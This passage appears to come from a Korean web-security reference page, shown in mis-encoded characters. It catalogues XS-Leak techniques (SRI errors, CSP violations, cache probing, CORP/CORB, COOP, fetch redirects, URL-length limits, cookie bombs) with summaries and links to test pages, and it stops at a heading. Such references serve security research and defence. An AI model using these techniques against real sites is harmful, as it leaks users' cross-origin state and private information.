ê³µê²©ìëŠ” **ìƒì„¸í•œ ì˜¤ë¥˜ ë©”ì‹œì§€**ë¥¼ ì´ìš©í•˜ì—¬ êµì°¨ ì¶œì²˜ ì‘ë‹µì˜ í¬ê¸°ë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” Subresource Integrity(SRI) ë©”ì»¤ë‹ˆì¦˜ ë•ë¶„ì— ê°€ëŠ¥í•˜ë©°, SRIëŠ” ë¦¬ì†ŒìŠ¤ê°€ CDNsì—ì„œ ê°€ì ¸ì˜¨ ê²½ìš° ë³€ì¡°ë˜ì§€ ì•Šì•˜ëŠ”ì§€ ê²€ì¦í•˜ê¸° ìœ„í•´ ë¬´ê²°ì„± ì†ì„±ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. SRIê°€ êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ì—ì„œ ì‘ë™í•˜ë ¤ë©´ **CORS ì§€ì›**ì´ í•„ìš”í•˜ë©°, ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ë¬´ê²°ì„± ê²€ì‚¬ë¥¼ ë°›ì§€ ì•ŠìŠµë‹ˆë‹¤. ë³´ì•ˆ ì£¼ì¥(SA)ì—ì„œ CORS ì˜¤ë¥˜ XS-Leakì™€ ìœ ì‚¬í•˜ê²Œ, ë¬´ê²°ì„± ì†ì„±ì´ ìˆëŠ” fetch ìš”ì²­ì´ ì‹¤íŒ¨í•œ í›„ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” **ê°€ì§œ í•´ì‹œ ê°’**ì„ ë¬´ê²°ì„± ì†ì„±ì— í• ë‹¹í•˜ì—¬ **ì´ ì˜¤ë¥˜ë¥¼ ì˜ë„ì ìœ¼ë¡œ ìœ ë°œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. SAì—ì„œ ê²°ê³¼ ì˜¤ë¥˜ ë©”ì‹œì§€ëŠ” ìš”ì²­ëœ ë¦¬ì†ŒìŠ¤ì˜ ì½˜í…ì¸  ê¸¸ì´ë¥¼ ìš°ì—°íˆ ë“œëŸ¬ëƒ…ë‹ˆë‹¤. ì´ ì •ë³´ ìœ ì¶œì€ ê³µê²©ìê°€ ì‘ë‹µ í¬ê¸°ì˜ ë³€í™”ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ì •êµí•œ XS-Leak ê³µê²©ì˜ ê¸¸ì„ ì—´ì–´ì¤ë‹ˆë‹¤.

### CSP ìœ„ë°˜/íƒì§€

* **í¬í•¨ ë°©ë²•**: íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ
* **ìì„¸í•œ ì •ë³´**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **ìš”ì•½:** CSPì—ì„œ í”¼í•´ìì˜ ì›¹ì‚¬ì´íŠ¸ë§Œ í—ˆìš©í•  ê²½ìš°, ë‹¤ë¥¸ ë„ë©”ì¸ìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ì„ ì‹œë„í•˜ë©´ CSPê°€ ê°ì§€ ê°€ëŠ¥í•œ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-LeakëŠ” CSPë¥¼ ì‚¬ìš©í•˜ì—¬ êµì°¨ ì¶œì²˜ ì‚¬ì´íŠ¸ê°€ ë‹¤ë¥¸ ì¶œì²˜ë¡œ ë¦¬ë””ë ‰ì…˜ë˜ì—ˆëŠ”ì§€ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ìœ ì¶œì€ ë¦¬ë””ë ‰ì…˜ì„ ê°ì§€í•  ìˆ˜ ìˆì§€ë§Œ, ì¶”ê°€ë¡œ ë¦¬ë””ë ‰ì…˜ ëŒ€ìƒì˜ ë„ë©”ì¸ë„ ìœ ì¶œë©ë‹ˆë‹¤. ì´ ê³µê²©ì˜ ê¸°ë³¸ ì•„ì´ë””ì–´ëŠ” **ê³µê²©ì ì‚¬ì´íŠ¸ì—ì„œ ëŒ€ìƒ ë„ë©”ì¸ì„ í—ˆìš©í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ëŒ€ìƒ ë„ë©”ì¸ì— ìš”ì²­ì´ ë°œí–‰ë˜ë©´ **ë¦¬ë””ë ‰ì…˜**ì´ êµì°¨ ì¶œì²˜ ë„ë©”ì¸ìœ¼ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. **CSPëŠ”** ì´ì— ëŒ€í•œ ì ‘ê·¼ì„ ì°¨ë‹¨í•˜ê³  **ìœ ì¶œ ê¸°ë²•ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ìœ„ë°˜ ë³´ê³ ì„œë¥¼ ìƒì„±**í•©ë‹ˆë‹¤. ë¸Œë¼ìš°ì €ì— ë”°ë¼ **ì´ ë³´ê³ ì„œëŠ” ë¦¬ë””ë ‰ì…˜ì˜ ëŒ€ìƒ ìœ„ì¹˜ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
í˜„ëŒ€ ë¸Œë¼ìš°ì €ëŠ” ë¦¬ë””ë ‰ì…˜ëœ URLì„ í‘œì‹œí•˜ì§€ ì•Šì§€ë§Œ, ì—¬ì „íˆ êµì°¨ ì¶œì²˜ ë¦¬ë””ë ‰ì…˜ì´ ë°œìƒí–ˆìŒì„ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìºì‹œ

* **í¬í•¨ ë°©ë²•**: í”„ë ˆì„, íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í˜ì´ì§€ ì½˜í…ì¸ 
* **ìì„¸í•œ ì •ë³´**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **ìš”ì•½:** íŒŒì¼ì„ ìºì‹œì—ì„œ ì§€ì›ë‹ˆë‹¤. ëŒ€ìƒ í˜ì´ì§€ë¥¼ ì—´ê³  íŒŒì¼ì´ ìºì‹œì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ:**

ë¸Œë¼ìš°ì €ëŠ” ëª¨ë“  ì›¹ì‚¬ì´íŠ¸ì— ëŒ€í•´ í•˜ë‚˜ì˜ ê³µìœ  ìºì‹œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¶œì²˜ì— ê´€ê³„ì—†ì´ íŠ¹ì • íŒŒì¼ì´ **ìš”ì²­ë˜ì—ˆëŠ”ì§€** ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í˜ì´ì§€ê°€ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í•œ ê²½ìš°ì—ë§Œ ì´ë¯¸ì§€ë¥¼ ë¡œë“œí•˜ëŠ” ê²½ìš°, **ë¦¬ì†ŒìŠ¤ë¥¼ ë¬´íš¨í™”**(ë” ì´ìƒ ìºì‹œë˜ì§€ ì•Šë„ë¡, ìì„¸í•œ ì •ë³´ ë§í¬ ì°¸ì¡°)í•˜ê³ , í•´ë‹¹ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆëŠ” **ìš”ì²­ì„ ìˆ˜í–‰**í•œ ë‹¤ìŒ **ì˜ëª»ëœ ìš”ì²­**(ì˜ˆ: ë„ˆë¬´ ê¸´ referer í—¤ë” ì‚¬ìš©)ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¦¬ì†ŒìŠ¤ ë¡œë“œê°€ **ì˜¤ë¥˜ë¥¼ ìœ ë°œí•˜ì§€ ì•Šì•˜ë‹¤ë©´**, ì´ëŠ” **ìºì‹œë˜ì—ˆê¸° ë•Œë¬¸**ì…ë‹ˆë‹¤.

### CSP ì§€ì‹œë¬¸

* **í¬í•¨ ë°©ë²•**: í”„ë ˆì„
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **ìš”ì•½:** CSP í—¤ë” ì§€ì‹œë¬¸ì€ CSP iframe ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ íƒì§€í•  ìˆ˜ ìˆìœ¼ë©°, ì •ì±… ì„¸ë¶€ì •ë³´ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome(GC)ì˜ ìƒˆë¡œìš´ ê¸°ëŠ¥ì€ ì›¹ í˜ì´ì§€ê°€ iframe ìš”ì†Œì— ì†ì„±ì„ ì„¤ì •í•˜ì—¬ **ì½˜í…ì¸  ë³´ì•ˆ ì •ì±…(CSP)**ë¥¼ ì œì•ˆí•  ìˆ˜ ìˆê²Œ í•˜ë©°, ì •ì±… ì§€ì‹œë¬¸ì€ HTTP ìš”ì²­ê³¼ í•¨ê»˜ ì „ì†¡ë©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ, í¬í•¨ëœ ì½˜í…ì¸ ëŠ” **HTTP í—¤ë”ë¥¼ í†µí•´ ì´ë¥¼ ìŠ¹ì¸í•´ì•¼ í•˜ë©°**, ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ **ì˜¤ë¥˜ í˜ì´ì§€ê°€ í‘œì‹œë©ë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ iframeì´ ì´ë¯¸ CSPì— ì˜í•´ ê´€ë¦¬ë˜ê³  ìƒˆë¡œ ì œì•ˆëœ ì •ì±…ì´ ë” ì œí•œì ì´ì§€ ì•Šìœ¼ë©´ í˜ì´ì§€ëŠ” ì •ìƒì ìœ¼ë¡œ ë¡œë“œë©ë‹ˆë‹¤. ì´ ë©”ì»¤ë‹ˆì¦˜ì€ ê³µê²©ìê°€ ì˜¤ë¥˜ í˜ì´ì§€ë¥¼ ì‹ë³„í•˜ì—¬ êµì°¨ ì¶œì²˜ í˜ì´ì§€ì˜ **íŠ¹ì • CSP ì§€ì‹œë¬¸**ì„ ê°ì§€í•  ìˆ˜ ìˆëŠ” ê²½ë¡œë¥¼ ì—´ì–´ì¤ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ìˆ˜ì •ëœ ê²ƒìœ¼ë¡œ í‘œì‹œë˜ì—ˆì§€ë§Œ, ìš°ë¦¬ì˜ ë°œê²¬ì€ ì˜¤ë¥˜ í˜ì´ì§€ë¥¼ ê°ì§€í•  ìˆ˜ ìˆëŠ” **ìƒˆë¡œìš´ ìœ ì¶œ ê¸°ë²•**ì„ ë“œëŸ¬ë‚´ë©°, ê·¼ë³¸ì ì¸ ë¬¸ì œê°€ ì™„ì „íˆ í•´ê²°ë˜ì§€ ì•Šì•˜ìŒì„ ì‹œì‚¬í•©ë‹ˆë‹¤.

### **CORP**

* **í¬í•¨ ë°©ë²•**: Fetch API
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **ìš”ì•½:** êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ ì •ì±…(CORP)ìœ¼ë¡œ ë³´í˜¸ëœ ë¦¬ì†ŒìŠ¤ëŠ” í—ˆìš©ë˜ì§€ ì•Šì€ ì¶œì²˜ì—ì„œ ê°€ì ¸ì˜¬ ë•Œ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP í—¤ë”ëŠ” ìƒëŒ€ì ìœ¼ë¡œ ìƒˆë¡œìš´ ì›¹ í”Œë«í¼ ë³´ì•ˆ ê¸°ëŠ¥ìœ¼ë¡œ, ì„¤ì •ë˜ë©´ **ì£¼ì–´ì§„ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ no-cors êµì°¨ ì¶œì²˜ ìš”ì²­ì„ ì°¨ë‹¨í•©ë‹ˆë‹¤**. í—¤ë”ì˜ ì¡´ì¬ëŠ” ê°ì§€í•  ìˆ˜ ìˆìœ¼ë©°, CORPë¡œ ë³´í˜¸ëœ ë¦¬ì†ŒìŠ¤ëŠ” **ê°€ì ¸ì˜¬ ë•Œ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤**.

### CORB

* **í¬í•¨ ë°©ë²•**: HTML ìš”ì†Œ
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **ìš”ì•½**: CORBëŠ” ê³µê²©ìê°€ ìš”ì²­ì— **`nosniff` í—¤ë”ê°€ ì¡´ì¬í•˜ëŠ”ì§€** ê°ì§€í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë§í¬ë¥¼ í™•ì¸í•˜ì„¸ìš”.

### ì¶œì²˜ ë°˜ì‚¬ ì˜ëª» êµ¬ì„±ìœ¼ë¡œ ì¸í•œ CORS ì˜¤ë¥˜ <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **í¬í•¨ ë°©ë²•**: Fetch API
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **ìš”ì•½**: Origin í—¤ë”ê°€ `Access-Control-Allow-Origin` í—¤ë”ì— ë°˜ì˜ë˜ë©´ ë¦¬ì†ŒìŠ¤ê°€ ì´ë¯¸ ìºì‹œì— ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

**Origin í—¤ë”**ê°€ `Access-Control-Allow-Origin` í—¤ë”ì— **ë°˜ì˜**ë˜ëŠ” ê²½ìš°, ê³µê²©ìëŠ” ì´ ë™ì‘ì„ ì•…ìš©í•˜ì—¬ **CORS** ëª¨ë“œì—ì„œ **ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì ¸ì˜¤ë ¤ê³  ì‹œë„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì˜¤ë¥˜**ê°€ **ë°œìƒí•˜ì§€ ì•Šìœ¼ë©´**, ì´ëŠ” **ì›¹ì—ì„œ ì˜¬ë°”ë¥´ê²Œ ê²€ìƒ‰ë˜ì—ˆìŒì„ ì˜ë¯¸**í•˜ë©°, ì˜¤ë¥˜ê°€ **ë°œìƒí•˜ë©´**, ì´ëŠ” **ìºì‹œì—ì„œ ì ‘ê·¼ë˜ì—ˆê¸° ë•Œë¬¸**ì…ë‹ˆë‹¤(ì˜¤ë¥˜ëŠ” ìºì‹œê°€ ì›ë˜ ë„ë©”ì¸ì„ í—ˆìš©í•˜ëŠ” CORS í—¤ë”ê°€ ìˆëŠ” ì‘ë‹µì„ ì €ì¥í•˜ê¸° ë•Œë¬¸ì— ë°œìƒí•©ë‹ˆë‹¤).\
Originì´ ë°˜ì˜ë˜ì§€ ì•Šê³  ì™€ì¼ë“œì¹´ë“œê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°(`Access-Control-Allow-Origin: *`), ì´ëŠ” ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

## ì½ì„ ìˆ˜ ìˆëŠ” ì†ì„± ê¸°ìˆ 

### Fetch ë¦¬ë””ë ‰ì…˜

* **í¬í•¨ ë°©ë²•**: Fetch API
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ
* **ìì„¸í•œ ì •ë³´**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **ìš”ì•½:** GCì™€ SAëŠ” ë¦¬ë””ë ‰ì…˜ì´ ì™„ë£Œëœ í›„ ì‘ë‹µì˜ ìœ í˜•(opaque-redirect)ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ë° ê¸°íƒ€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ Fetch APIë¥¼ í†µí•´ ìš”ì²­ì„ ì œì¶œí•˜ë©´, `response.type` ì†ì„±ì„ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, ë§Œì•½ ê·¸ê²ƒì´ `opaqueredirect`ì™€ ê°™ë‹¤ë©´ ì‘ë‹µì€ ë¦¬ë””ë ‰ì…˜ì´ì—ˆìŠµë‹ˆë‹¤.

### COOP

* **í¬í•¨ ë°©ë²•**: íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **ìš”ì•½:** êµì°¨ ì¶œì²˜ ì˜¤í”„ë„ˆ ì •ì±…(COOP)ìœ¼ë¡œ ë³´í˜¸ëœ í˜ì´ì§€ëŠ” êµì°¨ ì¶œì²˜ ìƒí˜¸ì‘ìš©ìœ¼ë¡œë¶€í„°ì˜ ì ‘ê·¼ì„ ì°¨ë‹¨í•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

ê³µê²©ìëŠ” êµì°¨ ì¶œì²˜ HTTP ì‘ë‹µì—ì„œ êµì°¨ ì¶œì²˜ ì˜¤í”„ë„ˆ ì •ì±…(COOP) í—¤ë”ì˜ ì¡´ì¬ë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. COOPëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì™¸ë¶€ ì‚¬ì´íŠ¸ê°€ ì„ì˜ì˜ ì°½ ì°¸ì¡°ë¥¼ ì–»ì§€ ëª»í•˜ë„ë¡ ë°©ì§€í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ í—¤ë”ì˜ ê°€ì‹œì„±ì€ **`contentWindow` ì°¸ì¡°ì— ì ‘ê·¼í•˜ë ¤ê³  ì‹œë„í•¨ìœ¼ë¡œì¨ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. COOPê°€ ì¡°ê±´ë¶€ë¡œ ì ìš©ë˜ëŠ” ê²½ìš°, **`opener` ì†ì„±**ì€ ê²°ì •ì ì¸ ì§€í‘œê°€ ë©ë‹ˆë‹¤: COOPê°€ í™œì„±í™”ë˜ë©´ **ì •ì˜ë˜ì§€ ì•Šìœ¼ë©°**, ë¹„í™œì„±í™”ë˜ë©´ **ì •ì˜ë©ë‹ˆë‹¤**.

### URL ìµœëŒ€ ê¸¸ì´ - ì„œë²„ ì¸¡

* **í¬í•¨ ë°©ë²•**: Fetch API, HTML ìš”ì†Œ
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ / ì½˜í…ì¸ 
* **ìì„¸í•œ ì •ë³´**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **ìš”ì•½:** ë¦¬ë””ë ‰ì…˜ ì‘ë‹µ ê¸¸ì´ë¡œ ì¸í•´ ì‘ë‹µì˜ ì°¨ì´ë¥¼ ê°ì§€í•  ìˆ˜ ìˆìœ¼ë©°, ë„ˆë¬´ ê¸¸ë©´ ì„œë²„ê°€ ì˜¤ë¥˜ë¡œ ì¬ì „ì†¡í•˜ê³  ê²½ê³ ê°€ ìƒì„±ë©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

ì„œë²„ ì¸¡ ë¦¬ë””ë ‰ì…˜ì´ **ë¦¬ë””ë ‰ì…˜ ë‚´ì—ì„œ ì‚¬ìš©ì ì…ë ¥ì„ ì‚¬ìš©í•˜ê³ ** **ì¶”ê°€ ë°ì´í„°**ë¥¼ í¬í•¨í•˜ëŠ” ê²½ìš°, ì´ ë™ì‘ì„ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ **ì„œë²„**ëŠ” **ìš”ì²­ ê¸¸ì´ ì œí•œ**ì´ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ **ì‚¬ìš©ì ë°ì´í„°**ê°€ **ê¸¸ì´ - 1**ì´ë¼ë©´, **ë¦¬ë””ë ‰ì…˜**ì´ **ê·¸ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ê³ ** **ì¶”ê°€**ì ì¸ ê²ƒì„ **ë”í•˜ë©´**, **ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì—¬ ì˜¤ë¥˜ ì´ë²¤íŠ¸ë¥¼ í†µí•´ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì‚¬ìš©ìì—ê²Œ ì¿ í‚¤ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆë‹¤ë©´, **ì¶©ë¶„í•œ ì¿ í‚¤ë¥¼ ì„¤ì •í•˜ì—¬** ì´ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ ([**ì¿ í‚¤ í­íƒ„**](../hacking-with-cookies/cookie-bomb.md)) ê·¸ë˜ì„œ **ì •ìƒ ì‘ë‹µì˜ í¬ê¸° ì¦ê°€**ë¡œ ì¸í•´ **ì˜¤ë¥˜**ê°€ ë°œìƒí•©ë‹ˆë‹¤. ì´ ê²½ìš°, ë™ì¼í•œ ì‚¬ì´íŠ¸ì—ì„œ ì´ ìš”ì²­ì„ íŠ¸ë¦¬ê±°í•˜ë©´ `<script>`ê°€ ìë™ìœ¼ë¡œ ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ë¯€ë¡œ (ë”°ë¼ì„œ ì˜¤ë¥˜ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).\
**ì¿ í‚¤ í­íƒ„ + XS-Search**ì˜ ì˜ˆëŠ” ì´ ë¬¸ì„œì˜ ì˜ë„ëœ ì†”ë£¨ì…˜ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ë˜ëŠ” ë™ì¼í•œ ì»¨í…ìŠ¤íŠ¸ì— ìˆì–´ì•¼ ì´ ìœ í˜•ì˜ ê³µê²©ì— í•„ìš”í•©ë‹ˆë‹¤.

### URL ìµœëŒ€ ê¸¸ì´ - í´ë¼ì´ì–¸íŠ¸ ì¸¡

* **í¬í•¨ ë°©ë²•**: íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ / ì½˜í…ì¸ 
* **ìì„¸í•œ ì •ë³´**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **ìš”ì•½:** ë¦¬ë””ë ‰ì…˜ ì‘ë‹µ ê¸¸ì´ë¡œ ì¸í•´ ìš”ì²­ì˜ ì°¨ì´ë¥¼ ê°ì§€í•  ìˆ˜ ìˆìœ¼ë©°, ì°¨ì´ë¥¼ ì¸ì‹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium ë¬¸ì„œ](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length)ì— ë”°ë¥´ë©´, Chromeì˜ ìµœëŒ€ URL ê¸¸ì´ëŠ” 2MBì…ë‹ˆë‹¤.

> ì¼ë°˜ì ìœ¼ë¡œ, _ì›¹ í”Œë«í¼_ì€ URL ê¸¸ì´ì— ëŒ€í•œ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤(2^31ì´ ì¼ë°˜ì ì¸ ì œí•œì´ì§€ë§Œ). _Chrome_ì€ ì‹¤ìš©ì ì¸ ì´ìœ ë¡œ URLì„ ìµœëŒ€ **2MB**ë¡œ ì œí•œí•˜ë©°, í”„ë¡œì„¸ìŠ¤ ê°„ í†µì‹ ì—ì„œ ì„œë¹„ìŠ¤ ê±°ë¶€ ë¬¸ì œë¥¼ í”¼í•˜ê¸° ìœ„í•´ì„œì…ë‹ˆë‹¤.

ë”°ë¼ì„œ **ë¦¬ë””ë ‰ì…˜ URL ì‘ë‹µì´ í•œ ê²½ìš°ë³´ë‹¤ ë” í¬ë©´**, **2MBë³´ë‹¤ í° URLë¡œ ë¦¬ë””ë ‰ì…˜**ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, Chromeì€ **`about:blank#blocked`** í˜ì´ì§€ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**ëˆˆì— ë„ëŠ” ì°¨ì´ì **ì€ **ë¦¬ë””ë ‰ì…˜**ì´ **ì™„ë£Œë˜ì—ˆë‹¤ë©´**, `window.origin`ì´ **ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. êµì°¨ ì¶œì²˜ëŠ” í•´ë‹¹ ì •ë³´ë¥¼ ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ì œí•œ**ì´ **ì¶©ì¡±**ë˜ê³  ë¡œë“œëœ í˜ì´ì§€ê°€ **`about:blank#blocked`**ì¸ ê²½ìš°, ì°½ì˜ **`origin`**ì€ **ë¶€ëª¨**ì˜ ê²ƒì´ë©°, ì´ëŠ” **ì ‘ê·¼ ê°€ëŠ¥í•œ ì •ë³´ì…ë‹ˆë‹¤.**

**2MB**ì— ë„ë‹¬í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ëª¨ë“  ì¶”ê°€ ì •ë³´ëŠ” ì´ˆê¸° URLì˜ **í•´ì‹œ**ë¥¼ í†µí•´ ì¶”ê°€í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ **ë¦¬ë””ë ‰ì…˜ì— ì‚¬ìš©ë©ë‹ˆë‹¤**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### ìµœëŒ€ ë¦¬ë””ë ‰ì…˜

* **í¬í•¨ ë°©ë²•**: Fetch API, í”„ë ˆì„
